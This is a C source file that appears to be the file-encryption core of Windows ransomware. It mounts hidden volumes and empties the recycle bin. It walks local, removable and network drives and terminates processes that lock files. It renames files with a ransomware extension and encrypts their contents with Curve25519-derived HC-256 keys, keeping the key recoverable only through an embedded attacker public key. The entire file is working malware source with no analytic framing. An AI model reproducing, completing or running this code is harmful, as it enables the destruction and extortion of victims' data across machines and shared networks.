#include "encryptor.h"
#include <other/memory.h>
#include <other/settings.h>
#include <other/utility.h>
#include "wsinternal.h"
#include "util.h"
#include "debug.h"
#include "curve25519.h"
#include "ecrypt-sync.h"
#include "sha512.h"
#include "crc32.h"

/* Public key to encrypt private key with. */
static BYTE g_PUBLIC_KEY[] = { 0x4f, 0xb4, 0x2c, 0xff, 0x34, 0x5f, 0x8f,
    0x7f, 0xe9, 0xdd, 0xe0, 0xec, 0x48, 0x17, 0x6c, 0x01, 0x0c, 0x33, 0x5d,
    0x43, 0x17, 0x58, 0x85, 0x61, 0x58, 0xba, 0x77, 0xb6, 0xb7, 0x2b, 0x82, 0x7e };

/* Directories that should not be encrypted. */
static const wchar_t* IGNORE_DIRECTORIES[] = { L".", L"..", L"$windows.~bt",
    L"intel", L"msocache", L"$recycle.bin", L"$windows.~ws", L"tor browser",
    L"boot", L"windows nt", L"msbuild", L"microsoft", L"all users",
    L"system volume information", L"perflog", L"google", L"application data",
    L"windows", L"windows.old", L"appdata", L"mozilla", L"microsoft.net",
    L"microsoft shared", L"internet explorer", L"common files", L"opera",
    L"windows journal", L"windows defender", L"windowsapp",
    L"windowspowershell", L"usoshared", L"windows security",
    L"windows photo viewer" };
/* Files that should not be encrypted. */
static const wchar_t* IGNORE_FILES[] = { L"ntldr", L"ntuser.dat.log",
    L"bootsect.bak", L"autorun.inf", L"thumbs.db", L"iconcache.db" };
/* Files with those extensions should not be encrypted. */
static const wchar_t* IGNORE_EXTENSIONS[] = { L".exe", L".dll",
    L".lnk", L".sys", L".msi", L".bat", RANSOMWARE_EXTENSION };

static HANDLE g_hCompletionPort; /* Handle for the IO completion port. */
static HCRYPTPROV g_hCryptProv; /* Handle for the crypto service provider. */
static DWORD g_currentPID; /* Current PID. */
static BOOL g_finishedIterating = FALSE; /* True if finished iterating all drives. */
static BYTE g_publicKey[32]; /* Global public key to encrypt the files with. */

static DWORD WINAPI encryptionThread(LPVOID lpParam);
static DWORD WINAPI driveThread(LPVOID lpParam);
static void iterateDirectory(const wchar_t* path);
static inline void encryptFile(HANDLE hFile);
static inline BOOL generateAndStoreKeys();

wchar_t* getPublicKey()
{
    return g_publicKey;
}

BOOL mountVolumes()
{
    wchar_t volumeName[MAX_PATH];
    HANDLE hVolume = FindFirstVolumeW(volumeName, ARRAYSIZE(volumeName));
    if (hVolume == INVALID_HANDLE_VALUE)
        return FALSE;

    size_t index = 0, mountedCount;
    DWORD charCount = 0;
    WCHAR deviceName[MAX_PATH];
    BOOL status = FALSE;
    while (TRUE)
    {
        mountedCount = 0;

        index = wcslen(volumeName) - 1;
        if (volumeName[0] != L'\\' || volumeName[1] != L'\\' ||
            volumeName[2] != L'?' || volumeName[3] != L'\\' ||
            volumeName[index] != L'\\')
            goto cleanup;   // Invalid path

        volumeName[index] = L'\0';
        charCount = QueryDosDeviceW(&volumeName[4], deviceName, ARRAYSIZE(deviceName));
        volumeName[index] = L'\\';

        if (!charCount)     // Function failed
            goto cleanup;

        // Get the volume paths
        charCount = MAX_PATH + 1;
        while (TRUE)
        {
            wchar_t* names = (wchar_t*)smalloc(charCount, sizeof(wchar_t));
            if (GetVolumePathNamesForVolumeNameW(volumeName, names, charCount, &charCount))
            {
                wchar_t* nameIDX;
                for (nameIDX = names; nameIDX[0] != L'\0'; nameIDX += wcslen(nameIDX) + 1)
                    mountedCount++;

                sfree(names);
                break;
            }
            else
            {
                sfree(names);
                if (GetLastError() != ERROR_MORE_DATA)
                    goto next_volume;

                // Retry, but this time the buffer will be large enough
                continue;
            }
        }
        
        // Mount volumes that havn't been mounted and are large enough
        UINT dt = GetDriveTypeW(volumeName);
        if ((dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) && mountedCount == 0)
        {
            ULARGE_INTEGER dwTotalBytes;
            if (!GetDiskFreeSpaceExW(volumeName, NULL, &dwTotalBytes, NULL))
                goto next_volume;
            
            if (dwTotalBytes.QuadPart < VOLUME_SIZE)
            {
                dbgmsg("Not mounting %ls because it's not big enough (0x%x)\n", deviceName, dwTotalBytes.QuadPart);
                goto next_volume;
            }
            
#ifndef DEBUG
            wchar_t mountingPoint[4] = { 0 };
            for (wchar_t c = L'Z'; c >= L'A'; c--)
            {
                mountingPoint[0] = c; mountingPoint[1] = L':'; mountingPoint[2] = L'\\';
                if (SetVolumeMountPointW(mountingPoint, volumeName))
                {
                    dbgmsg("Mounted %ls to %ls\n", deviceName, mountingPoint);
                    break;
                }
            }
#else
            dbgmsg("Mounting (DEBUG) %ls\n", deviceName);
#endif
        }
        
        // Move to the next volume
    next_volume:
        if (!FindNextVolumeW(hVolume, volumeName, ARRAYSIZE(volumeName)))
        {
            if (GetLastError() == ERROR_NO_MORE_FILES)
            {
                status = TRUE;
                break;
            }

            goto cleanup;
        }
    }

cleanup:
    FindVolumeClose(hVolume);
    return status;
}

BOOL generateAndStoreKeys()
{
    static const BYTE BASEPOINT[32] = { 9 };

    Session_t session;
    FileMetadata_t mt;
    Keys_t keys;
    ECRYPT_ctx ctx;

    // Generate a private key
    CryptGenRandom(g_hCryptProv, 32, session.curve25519Private);
    session.curve25519Private[0] &= 248;
    session.curve25519Private[31] &= 127;
    session.curve25519Private[31] |= 64;
    
    // Generate a public key
    curve25519(mt.curve25519Public, session.curve25519Private, BASEPOINT);
    sstrcpy(g_publicKey, sizeof(g_publicKey), mt.curve25519Public);
    // Generate a shared secret
    curve25519(session.curve25519Shared, session.curve25519Private, g_PUBLIC_KEY);
    
    // Initialize the Key & IV for the HC128 algorithm
    SHA512_Simple(session.curve25519Shared, sizeof(session.curve25519Shared), &keys);
    ECRYPT_keysetup(&ctx, keys.hc256Key, 256, 256);
    ECRYPT_ivsetup(&ctx, keys.hc256Vector);
    mt.xcrc32Hash = xcrc32(&keys, sizeof(Keys_t));

    // Clear sensitive data from memory
    memset(ctx.key, 0, sizeof(ctx.key));
    memset(&keys, 0, sizeof(Keys_t));
    
    // Encrypt the private key
    DWORD size = sizeof(session.curve25519Private);
    BYTE* buffer = (BYTE*)smalloc(size, sizeof(BYTE));
    sstrcpy(buffer, size, session.curve25519Private);
    ECRYPT_process_bytes(0, &ctx, buffer, buffer, size);
    
    // Write the private key
#ifndef DEBUG
    wchar_t* filePath = getSpecialDirectory(&FOLDERID_Desktop);
    if (!filePath)
        return FALSE;
    lstrcatW(filePath, L"\\");
    lstrcatW(filePath, ENC_PK_FILE_NAME);
    
    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        sfree(filePath);
        return FALSE;
    }
    
    DWORD dwWrite;
    if (!WriteFile(hFile, buffer, size, &dwWrite, NULL))        // Write encrypted data
        goto cleanup;
    if (!WriteFile(hFile, &mt, sizeof(mt), &dwWrite, NULL))     // Write metadata
        goto cleanup;
    
cleanup:
    memset(&session, 0, sizeof(Session_t));
    CloseHandle(hFile);
    sfree(filePath);
#endif
    
    return TRUE;
}

BOOL preEncryptionInitialization()
{
    g_currentPID = GetCurrentProcessId();
    if (!CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
        !CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
        return FALSE;

    // Generate global public-private keys
    if (!generateAndStoreKeys())
    {
        CryptReleaseContext(g_hCryptProv, 0);
        return FALSE;
    }

    return TRUE;
}

BOOL encryptDrives()
{
    DWORD processorsCount = getSystemInfo().dwNumberOfProcessors;
    dbgmsg("%lu processors found\n", processorsCount);
    
    // Create a handle for the IO completion port
    g_hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, processorsCount);
    if (!g_hCompletionPort)
        return FALSE;
    
    // Create encryption threads
    HANDLE* encryptionThreads = (HANDLE*)smalloc(processorsCount, sizeof(HANDLE));
    for (DWORD i = 0; i < processorsCount; i++)
    {
        HANDLE hEncryptionThread = CreateThread(NULL, 0, encryptionThread, NULL, 0, NULL);
        if (!hEncryptionThread)
            return FALSE;

        // Run the current thread on a specific core
        DWORD_PTR mask = 1ULL << i;
        if (!SetThreadAffinityMask(hEncryptionThread, mask))
            return FALSE;
        
        encryptionThreads[i] = hEncryptionThread;
    }
    
    DWORD enumeratedDrives = 0, drivesBitmask = GetLogicalDrives();
    if (!drivesBitmask)
        goto cleanup;
    
    // Empty recycle bins
#ifndef DEBUG
    SHEmptyRecycleBinW(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
#endif
    
    // Create iterator threads
    DWORD i = 0;
    HANDLE iteratorThreads[MAX_ITERATOR_THREADS];
    while (drivesBitmask)
    {
        if (drivesBitmask & 1)
        {
            const wchar_t driveLetter = L'A' + enumeratedDrives;
            HANDLE hIteratorThread = CreateThread(NULL, 0, driveThread, (LPVOID)driveLetter, 0, NULL);
            if (!hIteratorThread)
                return FALSE;

            iteratorThreads[i++] = hIteratorThread;
        }

        enumeratedDrives++;
        drivesBitmask >>= 1;
    }

    // Wait for all iterators to finish
    WaitForMultipleObjects(i, iteratorThreads, TRUE, INFINITE);
    g_finishedIterating = TRUE;
    for (DWORD j = 0; j < i; j++)
        CloseHandle(iteratorThreads[j]);
    
    // Wait for all encryptors to finish
    WaitForMultipleObjects(processorsCount, encryptionThreads, TRUE, INFINITE);
    for (DWORD j = 0; j < processorsCount; j++)
        CloseHandle(encryptionThreads[j]);
    
cleanup:
    sfree(encryptionThreads);
    CloseHandle(g_hCompletionPort);
    CryptReleaseContext(g_hCryptProv, 0);
    
    return TRUE;
}

BOOL terminateFileProcesses(const wchar_t* filePath)
{
#ifdef DEBUG
    return FALSE;
#else
    DWORD dwSession;
    wchar_t sessionName[CCH_RM_SESSION_KEY + 1] = { 0 };
    if (RmStartSession(&dwSession, 0, sessionName) != ERROR_SUCCESS)
        return FALSE;

    LPCWSTR files[] = { filePath };
    if (RmRegisterResources(dwSession, 1, files, 0, NULL, 0, NULL) != ERROR_SUCCESS)
    {
        RmEndSession(dwSession);
        return FALSE;
    }

    UINT nProcInfoNeeded = 0, nProcInfo = 5;
    DWORD dwReason, err;
    RM_PROCESS_INFO* rgpi = (RM_PROCESS_INFO*)smalloc(nProcInfo, sizeof(RM_PROCESS_INFO));
    err = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason);

    if (err == ERROR_MORE_DATA)
    {
        // nProcInfoNeeded contains the required memory size. free and retry
        sfree(rgpi);
        nProcInfo = nProcInfoNeeded;

        rgpi = (RM_PROCESS_INFO*)smalloc(nProcInfo, sizeof(RM_PROCESS_INFO));
        err = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason);
    }

    if (err != ERROR_SUCCESS)
    {
        sfree(rgpi);
        RmEndSession(dwSession);

        return FALSE;
    }

    BOOL status = FALSE;
    RM_APP_TYPE appType;
    for (DWORD i = 0; i < nProcInfo; i++)
    {
        // Terminate processes that are not critical, explorer or us
        appType = rgpi[i].ApplicationType;
        if (appType == RmCritical || appType == RmExplorer || rgpi[i].Process.dwProcessId == g_currentPID)
            goto cleanup;

        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rgpi[i].Process.dwProcessId);
        if (!hProcess)
            goto cleanup;
        if (!TerminateProcess(hProcess, 0))
        {
            CloseHandle(hProcess);
            goto cleanup;
        }
        
        CloseHandle(hProcess);
    }
    
    status = TRUE;

cleanup:
    sfree(rgpi);
    RmEndSession(dwSession);

    return status;
#endif
}

DWORD WINAPI encryptionThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    static const DWORD DW_MILLISECONDS = 1 * 1000;
    
    wchar_t* filePath, * fileName;
    while (TRUE)
    {
        DWORD bytesRead;
        ULONG_PTR completionKey;
        LPOVERLAPPED pOverlapped;
        
        // Get the pending request, wait 1 second before stopping
        if (GetQueuedCompletionStatus(g_hCompletionPort, &bytesRead, &completionKey, &pOverlapped, DW_MILLISECONDS))
        {
            filePath = (wchar_t*)completionKey;
            
            // Skip the file if it's in the blacklisted extensions or files
            fileName = CharLowerW(getFileName(filePath));
            if (valueInArray(getExtension(fileName), IGNORE_EXTENSIONS, _countof(IGNORE_EXTENSIONS)))
                goto cleanup;
            if (valueInArray(fileName, IGNORE_FILES, _countof(IGNORE_FILES)))
                goto cleanup;
            
            wchar_t newPath[MAX_PATH];
#ifndef DEBUG
            wsprintfW(newPath, L"%ls%ls", filePath, RANSOMWARE_EXTENSION);
            if (!MoveFileExW(filePath, newPath, MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING))
                goto cleanup;
#else
            lstrcpyW(newPath, filePath);
#endif
            
            HANDLE hFile = CreateFileW(newPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
            if (hFile == INVALID_HANDLE_VALUE)
            {
                if (GetLastError() != ERROR_SHARING_VIOLATION)
                    goto cleanup;
                
                // Try to close the processes that are using the file
                if (!terminateFileProcesses(newPath))
                    goto cleanup;
                
                // Successfully closed all processes that were using the file, retry opening it
                hFile = CreateFileW(newPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
                if (hFile == INVALID_HANDLE_VALUE)
                    goto cleanup;
            }
            
            encryptFile(hFile);
            CloseHandle(hFile);

        cleanup:
            sfree(filePath);
        }
        else if (GetLastError() == WAIT_TIMEOUT && g_finishedIterating)
            break;  // No more files
    }
    
    return 0;
}

DWORD WINAPI driveThread(LPVOID lpParam)
{
    wchar_t path[3] = { 0 };
    path[0] = (wchar_t)lpParam; path[1] = L':';
    
    DWORD driveType;
    if (driveType = GetDriveTypeW(path))
    {
        if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM)
        {
            dbgmsg("Encrypting drive %ls\n", path);
            iterateDirectory(path);
        }
        else if (driveType == DRIVE_REMOTE)
        {
            wchar_t buffer[MAX_PATH * 4];
            DWORD dwBufferLength = MAX_PATH * 4;
            UNIVERSAL_NAME_INFO* unameInfo = (UNIVERSAL_NAME_INFO*)&buffer;

            // Try to get the universal name
            if (WNetGetUniversalNameW(path, UNIVERSAL_NAME_INFO_LEVEL, unameInfo, &dwBufferLength) == NO_ERROR)
            {
                dbgmsg("Encrypting network drive %ls -> %ls\n", path, unameInfo->lpUniversalName);
                iterateDirectory(unameInfo->lpUniversalName);
            }
            else
            {
                // If failed to get the universal name, attempt to get the remote name
                dwBufferLength = MAX_PATH * 4;
                REMOTE_NAME_INFO* remInfo = (REMOTE_NAME_INFO*)&buffer;
                
                if (WNetGetUniversalNameW(path, REMOTE_NAME_INFO_LEVEL, remInfo, &dwBufferLength) == NO_ERROR)
                {
                    dbgmsg("Encrypting network drive %ls -> %ls\n", path, remInfo->lpUniversalName);
                    iterateDirectory(remInfo->lpUniversalName);
                }
                else
                    dbgmsg("Failed getting Universal or Remote name for network drive %ls\n", path);
            }
        }
    }
    else
        dbgmsg("Unknown drive %ls (%u)\n", path, driveType);
    
    return 0;
}

void iterateDirectory(const wchar_t* path)
{
    wchar_t newPath[MAX_PATH];
    wsprintfW(newPath, L"%ls\\*", path);
    size_t wlen = (size_t)lstrlenW(newPath) - 1;

    WIN32_FIND_DATAW fd;
    HANDLE hHandle = FindFirstFileW(newPath, &fd);
    if (hHandle == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            // Skip the directory if it's in the blacklisted directories
            if (valueInArray(CharLowerW(fd.cFileName), IGNORE_DIRECTORIES, _countof(IGNORE_DIRECTORIES)))
                continue;

            // Copy the filename on top the of asterisk to avoid copying twice
            lstrcpyW(newPath + wlen, fd.cFileName);
            iterateDirectory(newPath);
        }
        else if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM))
        {
            wchar_t* aPath = (wchar_t*)smalloc(MAX_PATH, sizeof(wchar_t));
            wsprintfW(aPath, L"%ls\\%ls", path, fd.cFileName);

            // If the file is readonly, mark it as writable
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
            {
                if (!SetFileAttributesW(aPath, FILE_ATTRIBUTE_NORMAL))
                {
                    sfree(aPath);
                    continue;
                }
            }
            
            // Send the path to the IO completion port to be received by the encryption threads
            if (!PostQueuedCompletionStatus(g_hCompletionPort, 0, (ULONG_PTR)aPath, NULL))
                sfree(aPath);
        }
    } while (FindNextFileW(hHandle, &fd));

    FindClose(hHandle);
}

void encryptFile(HANDLE hFile)
{
    static const BYTE BASEPOINT[32] = { 9 };
    LARGE_INTEGER fileSize, fileOffset, fileChunks;
    if (!GetFileSizeEx(hFile, &fileSize))
        return;
    
    ECRYPT_ctx ctx;
    Keys_t keys;
    Session_t session;
    FileMetadata_t mt;
    
    // Generate a private key
    CryptGenRandom(g_hCryptProv, 32, session.curve25519Private);
    session.curve25519Private[0] &= 248;
    session.curve25519Private[31] &= 127;
    session.curve25519Private[31] |= 64;
    
    // Generate a public key
    curve25519(mt.curve25519Public, session.curve25519Private, BASEPOINT);
    // Generate a shared secret
    curve25519(session.curve25519Shared, session.curve25519Private, g_publicKey);
    
    // Initialize the Key & IV for the HC128 algorithm
    SHA512_Simple(session.curve25519Shared, sizeof(session.curve25519Shared), &keys);
    ECRYPT_keysetup(&ctx, keys.hc256Key, 256, 256);
    ECRYPT_ivsetup(&ctx, keys.hc256Vector);
    mt.xcrc32Hash = xcrc32(&keys, sizeof(Keys_t));

    // Clear sensitive data from memory
    memset(ctx.key, 0, sizeof(ctx.key));
    memset(&keys, 0, sizeof(Keys_t));
    memset(&session, 0, sizeof(Session_t));
    
    // Encrypt the file
    DWORD dwRead, dwWrite;
    BYTE* buffer = (BYTE*)smalloc(READ_BLOCK_SIZE, sizeof(BYTE));
    fileOffset.QuadPart = 0;
    
    if (fileSize.QuadPart > LARGE_FILE_SIZE)
    {
        fileChunks.QuadPart = fileSize.QuadPart / 0xA00000i64;
        for (LONGLONG i = 0; i < fileChunks.QuadPart; i++)
        {
            if (!ReadFile(hFile, buffer, READ_BLOCK_SIZE, &dwRead, 0) || (dwRead != READ_BLOCK_SIZE))
                goto end;
            
#ifndef DEBUG
            ECRYPT_process_bytes(0, &ctx, buffer, buffer, dwRead);
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
            WriteFile(hFile, buffer, READ_BLOCK_SIZE, &dwWrite, 0);
#endif
            fileOffset.QuadPart += 0xA00000i64;
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
        }
    }
    else if (fileSize.QuadPart > MEDIUM_FILE_SIZE)
    {
        LONGLONG jump = fileSize.QuadPart / 3;
        for (LONGLONG i = 0; i < 3; i++)
        {
            if (!ReadFile(hFile, buffer, READ_BLOCK_SIZE, &dwRead, 0) || (dwRead != READ_BLOCK_SIZE))
                goto end;
            
#ifndef DEBUG
            ECRYPT_process_bytes(0, &ctx, buffer, buffer, dwRead);
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
            WriteFile(hFile, buffer, dwRead, &dwWrite, 0);
#endif
            fileOffset.QuadPart += jump;
            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
        }
    }
    else
    {
        LONGLONG blockSize = fileSize.QuadPart > 64 ? fileSize.QuadPart / 10 : fileSize.QuadPart;
        if (!ReadFile(hFile, buffer, blockSize, &dwRead, 0) || (dwRead != blockSize))
            goto end;
        
#ifndef DEBUG
        ECRYPT_process_bytes(0, &ctx, buffer, buffer, dwRead);
        SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
        WriteFile(hFile, buffer, dwRead, &dwWrite, 0);
#endif
    }
    
#ifndef DEBUG
    // Write the metadata to the end of the file
    fileOffset.QuadPart = 0;
    SetFilePointerEx(hFile, fileOffset, 0, FILE_END);
    WriteFile(hFile, &mt, sizeof(FileMetadata_t), &dwWrite, 0);
#endif
    
end:
    memset(&ctx, 0, sizeof(ECRYPT_ctx));
    sfree(buffer);
}